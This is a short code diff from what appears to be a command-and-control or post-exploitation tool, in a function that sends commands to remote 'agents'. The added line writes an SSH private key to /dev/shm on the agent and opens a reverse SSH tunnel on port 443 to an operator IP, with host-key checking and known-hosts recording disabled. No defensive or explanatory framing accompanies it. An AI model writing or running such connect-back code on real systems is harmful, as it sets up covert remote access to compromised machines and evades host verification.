@@ -524,7 +524,7 @@ def parse_command(command, database):
                             return
 
                         proxy_data['Target'] = int(cmd[2])
-                        connect_back_cmd = 'ssh -R 443 {}@{}'.format(proxy_data['SSHUser']['UserName'], proxy_data['IP'])
+                        connect_back_cmd = 'echo "{}" > /dev/shm/tmp11 && ssh -i /dev/shm/tmp11 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 443 {}@{}'.format(proxy_data['SSHUser']['SSHKey'], proxy_data['SSHUser']['UserName'], proxy_data['IP'])
                         global_config['Proxy'].run_cmd(proxy_data['Target'], global_config['Proxy'].all_connections[int(cmd[2])], connect_back_cmd)
                 except:
                     print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
